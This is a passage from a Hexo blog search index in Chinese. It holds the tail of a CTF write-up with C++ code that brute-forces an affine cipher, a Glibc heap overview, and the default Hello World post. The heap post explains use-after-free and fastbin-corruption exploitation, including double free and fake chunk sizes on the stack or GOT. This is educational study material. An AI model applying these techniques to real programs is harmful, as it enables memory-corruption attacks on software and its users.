class="hljs-string">"gf9C&#123;YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7"</span>)</span></span>;   <span class="hljs-comment">//明文空间，与已知密文</span>  <span class="hljs-built_in">string</span> C;  <span class="hljs-comment">//存放解密明文</span>  <span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>;   <span class="hljs-comment">//求解所有互素的数</span>  <span class="hljs-keyword">int</span> a1;  <span class="hljs-comment">//存放逆元</span>  <span class="hljs-keyword">for</span> (i; i &lt; PSIZE; i++)  &#123;    <span class="hljs-keyword">if</span> (gcd(i, PSIZE) == <span class="hljs-number">1</span>)    &#123;  <span class="hljs-comment">//说明此时的i与28互素</span>      <span class="hljs-comment">/***求解此时的i的逆元***/</span>      a1 = init_gcd(i, PSIZE);      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; PSIZE; j++)   <span class="hljs-comment">//控制b的遍历</span>      &#123;        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"此时：a="</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">" b="</span> &lt;&lt; j &lt;&lt; <span class="hljs-string">" a的逆元为："</span> &lt;&lt; a1 &lt;&lt; <span class="hljs-string">"   \""</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; M.length(); k++) &#123;     <span class="hljs-comment">//每一个汉字站两个字节，所以要用两个数组空间来存</span>          <span class="hljs-keyword">int</span> where = des_find(P, M[k]);   <span class="hljs-comment">//匹配密文在明文空间的位置</span>          where = ((where - j)*a1) % PSIZE;          <span class="hljs-keyword">if</span> (where &lt; <span class="hljs-number">0</span>) &#123;            where += PSIZE;          &#125;          <span class="hljs-built_in">cout</span> &lt;&lt; P[where];        &#125;        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"\""</span> &lt;&lt; <span class="hljs-built_in">endl</span>;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> a)</span>    <span class="hljs-comment">//求互素</span></span>&#123;  <span class="hljs-keyword">int</span> temp;  <span class="hljs-keyword">if</span> (a &lt; b)<span class="hljs-comment">//判断大小</span>  &#123;    temp = a;    a = b;    b = temp;  &#125;  <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> a;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> gcd(b, a%b);<span class="hljs-comment">//递归</span>&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">init_gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n)</span>   <span class="hljs-comment">//扩展欧几里得算法</span></span>&#123;  <span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>;  <span class="hljs-keyword">for</span> (i; i &lt; <span class="hljs-number">28</span>; i++)  &#123;    <span class="hljs-keyword">if</span> ((m*i) % n == <span class="hljs-number">1</span>)    &#123;      <span class="hljs-keyword">return</span> i;    &#125;  &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">des_find</span><span class="hljs-params">(<span class="hljs-built_in">string</span> p, <span class="hljs-keyword">int</span> m)</span>   <span class="hljs-comment">//位置匹配函数</span></span>&#123;  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; p.length(); i ++) &#123;    <span class="hljs-comment">//cout&lt;&lt;p[i]&lt;&lt;p[i+1]&lt;&lt;endl;</span>    <span class="hljs-keyword">if</span> (m == p[i]) &#123;      <span class="hljs-keyword">return</span>  i;    &#125;  &#125;&#125;</code></pre><p><strong>接下来的计划</strong><br>总结下base家族<br>wasm<br>贝叶斯<br>关于字符向进制转化的算法与逆向<br>pyc 文件格式<br>des加密ebc cbc</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc heap overview</title>
      <link href="/2019/01/05/Glibc-heap-overview/"/>
      <url>/2019/01/05/Glibc-heap-overview/</url>
      
        <content type="html"><![CDATA[<h1 id="Glibc-Heap">Glibc Heap<a class="post-anchor" href="#Glibc-Heap"></a></h1><ul><li>负责维护动态分配内存的数据结构称为 heap</li><li>libc 里面比较常用到的是 malloc 、free 、realloc<ul><li>C++ 里的 new、delete，底层的操作仍是上述的几个</li></ul></li><li>分配新内存空间、释放并回收不需要的部分，在分配内存的时候尽量避免<code>碎片化</code></li></ul><h2 id="Glibc-heap-实际操作概述">Glibc heap 实际操作概述<a class="post-anchor" href="#Glibc-heap-实际操作概述"></a></h2><ul><li><code>glibc/malloc/malloc.c</code></li><li>要做到堆内存的管理，需要知道<ul><li>有哪些位置的堆内存是可以被分配的</li><li>有哪些是因为 free 掉而可以回收的</li><li>有哪些位置是使用中则不需要记录，使用它们的人应记住这些指针</li></ul></li><li>整个 heap 的结构记录在一个 <code>struct malloc_state</code>中，称为 <code>main_arena</code></li><li><code>malloc</code> 分配的堆内存结构体称为 chunk，会比要求的大小要大一点，因为需要记录一些维护 heap 用的额外信息</li><li><code>arena</code> 跟 heap 分配的内存分开存放，heap overflow 无法直接去覆盖它的内容</li><li>回收的 chunk 用 linked list 记录，称为 bin</li><li>main_arena 中有很多个 bin，每个 bin 里存储的 chunk size 不同，目的是让 malloc 时可以尽快找到最适合大小的 chunk</li><li>回收的 chunk 会依据 size 来决定应该放那个 linked list</li><li><code>malloc</code> 时，优先从 bin 里面找出可以使用的 chunk，如果找不到才会真的分配新的内存给程序使用。分配时可以去找到足够大的 chunk 只切出需要的部分，剩下的部分形成新的 chunk<code>(last_remainder)</code>。</li><li>找不到可用空间时会从 top chunk 分配，top chunk 是一个很大的 chunk，代表可使用但未分配的内存，malloc 分配时会从里面切一小块下来，剩下的部分重新设为 top</li></ul><h2 id="Chunk">Chunk<a class="post-anchor" href="#Chunk"></a></h2><ul><li><p>存放 chunk metadata 的 chunk 结构 （header）</p></li><li><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>&#123;</span>  <span class="hljs-keyword">size_t</span> prev_size;  <span class="hljs-keyword">size_t</span> size;  malloc_chunk* fd;  malloc_chunk* bk;  malloc_chunk* fd_nextsize;  malloc_chunk* bk_nextsize;&#125;</code></pre></li><li><p>64 bit</p><ul><li><code>mem = malloc(size) -&gt; chunk=mem-16; chunksize = (size+8)#16</code></li><li>实际的 chunk 地址是 malloc 得到的地址 -16</li><li>chunksize 是 size + 8 后向上对齐至 16 的倍数，因为要存放额外的信息</li></ul></li><li><p>chunk 已回收（not inuse）</p><pre><code class="hljs undefined">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of previous chunk, if unallocated (P clear)  |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`head:&apos; |             Size of chunk, in bytes                     |A|0|P|  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Forward pointer to next chunk in list             |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Back pointer to previous chunk in list            |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Unused space (may be 0 bytes long)                .        .                                                               . next   .                                                               |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`foot:&apos; |             Size of chunk, in bytes                           |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of next chunk, in bytes                |A|0|0|        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre></li></ul><h3 id="chunk-header">chunk header<a class="post-anchor" href="#chunk-header"></a></h3><ul><li>size：这个 chunk 在内存里的大小，非 malloc size</li><li>fd，bk：指向 bin 里的前一、后一个 chunk<ul><li>一般来说 bin 是 double linked list</li></ul></li><li>prev_size：前一个 chunksize，维护 heap 时可以得知 前一个chunk的位置</li><li>概略来说，每个 chunk 可以看到四个相邻的 chunk<ul><li><code>chunk+size</code> 内存空间的下一个chunk</li><li><code>chunk - prev_size</code> 内存空间里的前一个 chunk</li><li><code>fd,bk</code> double linked list(bin),在内存中不一定是在前或后</li></ul></li></ul><h3 id="size">size<a class="post-anchor" href="#size"></a></h3><ul><li>size 位置 包含 chunk size 和 flag bits</li><li>chunk size 把 size 最低位 3bits 归 0<ul><li>fastbin &lt;= 128</li><li>Small bin &lt; 1024</li><li>Large bin</li><li>Mmap &gt;= 0x20000</li></ul></li><li>最低 bit 为 prev_inuse bit，用来表示 前一个 chunk 是不是在使用中<ul><li>free 会 使得下一个 chunk 的 prev_inuse bit 被设为 0</li></ul></li></ul><h3 id="Heap-操作">Heap 操作<a class="post-anchor" href="#Heap-操作"></a></h3><ul><li>p = malloc(size)<ul><li>找出一个可用的 chunk，或从 top chunk 切一块下来</li><li>如果这个 chunk 是回收的，要先从 bin 里面 unlink，即移出这个 linked list</li><li>填好结构，并回传 chunk + 16</li></ul></li><li>free(p)<ul><li>检查一下该 chunk 内存地址前后的 chunk，是不是 not inuse</li><li>如果有，则这些回收的 chunk 可以被合并成一块</li><li>合并后的新 chunk，放进对应的 bin 中</li></ul></li></ul><h2 id="Exploit-use-after-free">Exploit : use after free<a class="post-anchor" href="#Exploit-use-after-free"></a></h2><ul><li>跟 chunk bin 等 heap 的内部操作没什么关系</li><li>让程序里有两个指针指向同一块内存<ul><li>一块是 structure，另一块是用作 data buffer</li><li>利用对 buffer 的读写，修改或泄漏 structure 的内容</li></ul></li></ul><h3 id="利用-Chunk-的回收特性">利用 Chunk 的回收特性<a class="post-anchor" href="#利用-Chunk-的回收特性"></a></h3><ul><li>所谓 use after free，是指 free(=p) 掉后还继续使用它<ul><li>例：linked list remove 掉chunk后，忘了把指向它的指针置0，导致以为此 chunk 还存在 list 中</li></ul></li><li>重新 malloc(=p) 一样的大小，会拿到曾经 free 掉的 chunk，此时就存在两个指针 p、q 指向同一块 chunk，使用这两个指针的操作会混在一起<ul><li>例：其中一个是 C++ chunk，有个 vtable 指针用来找出实际的 function。如果另一个是可写入的 data buffer，就可以改掉 function pointer</li></ul></li><li>只要实际的 chunk size 相同，malloc 要求的大小不同也没关系。</li><li>会拿出哪个 chunk，取决于 heap 里 bin 的运作方式，不一定是最近 free 的那一个。</li></ul><h2 id="fastbin-corruption">fastbin corruption<a class="post-anchor" href="#fastbin-corruption"></a></h2><p><strong>基础知识</strong></p><ul><li><code>chunk size &lt;= get_max_fast()</code> 的 chunk，会被放在一系列称为 fastbin 的 bin 里<ul><li>64 bit 是 128 bytes，32bit 是 64 bytes</li><li>global_max_fast 一开始是 0</li></ul></li><li>fastbin 是 single linked list，只使用 fd，以 NULL 结尾</li><li>chunk size 从 32 开始，共 7 个可用的 fastbin</li><li>free 时不取消下个 chunk 的 prev_inuse bit，因为 fastbin chunk 不会与其他 chunk 合并</li><li>malloc、free 操作时 glibc 会有一些检查，确认 heap metadata 是否正确，避免一些可能的攻击方式</li><li>为了执行效率，fastbin 里的检查比其他类型的 bin 少很多</li></ul><p><strong>利用方式</strong></p><ul><li>让 fastbin linked list 指向任意地址，之后 malloc 时就会将该地址作为 chunk 拿出来</li><li>freed(not inuse) chunk 才会存在 bin 里，修改它的 fd 才会造成 corruption<ul><li>double free</li><li>overflow</li></ul></li></ul><pre><code class="hljs python">fastbin[0] ---&gt; chunk1   +---&gt; chunk2   +---&gt; chunk3  fd --+         fd --+         fd ---&gt; NULL..........&gt; arbitrary address</code></pre><h3 id="Fastbin-sanity-check">Fastbin sanity check<a class="post-anchor" href="#Fastbin-sanity-check"></a></h3><ul><li>malloc 从 bin 里取出时，要从正确的 bin 里拿出来，即 chunk size 要正确</li><li>free 时，nextchunk 的 size 要对</li><li>free 时会检查 bin 里第一个 chunk 是不是跟现在 free 的 chunk 是同一个（fasttop）</li><li>fasttop 只检查 bin 里第一个 chunk，只要不是连续 free 同一个 chunk 就没关系<ul><li><code>free(p);free(q);free(p)</code></li></ul></li><li>Double free 造成类似 use after free 的效果，可以改掉还在 bin 里的 chunk fd 的值<ul><li>bin 是由 fd 串起来的 linked list，改掉 fd 可以让 linked list 接往任意地址</li><li>多次 malloc 后，就会拿到一个地址可控制的 chunk</li></ul></li><li>取出的 chunk 其 size 要正确，所以并非是完全任意地址，要能构造假的 size<ul><li>用 stack 上的变量当作 size，可以 malloc 出一个 stack 上的地址</li><li>GOT上，用 64 bit 地址常见的 0x40 当作 size</li></ul></li><li>取得 chunk 后，由机会对该地址任意读写</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/10/10/hello-world/"/>
      <url>/2018/10/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start">Quick Start<a class="post-anchor" href="#Quick-Start"></a></h2><h3 id="Create-a-new-post">Create a new post<a class="post-anchor" href="#Create-a-new-post"></a></h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server">Run server<a class="post-anchor" href="#Run-server"></a></h3><pre><code class="hljs bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files">Generate static files<a class="post-anchor" href="#Generate-static-files"></a></h3><pre><code class="hljs bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites<a class="post-anchor" href="#Deploy-to-remote-sites"></a></h3><pre><code class="hljs bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
